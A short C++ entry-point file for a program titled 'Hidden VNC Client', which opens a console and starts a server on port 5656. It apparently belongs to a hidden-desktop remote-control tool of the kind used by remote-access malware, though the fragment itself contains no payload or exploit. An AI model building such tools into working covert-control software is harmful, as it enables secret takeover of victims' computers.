#include "Common.h"
#include "ControlWindow.h"
#include "Server.h"
#pragma comment(lib, "Shlwapi.lib")

int CALLBACK WinMain(HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR lpCmdLine,
   int nCmdShow)
{
   AllocConsole();

   freopen("CONIN$", "r", stdin); 
   freopen("CONOUT$", "w", stdout); 
   freopen("CONOUT$", "w", stderr); 

   SetConsoleTitle(TEXT("Hidden VNC Client"));

   if(!StartServer(5656))
   {
      wprintf(TEXT("Could not start the server (Error: %d)\n"), WSAGetLastError()); 
      getchar();
      return 0;
   }
   return 0;
}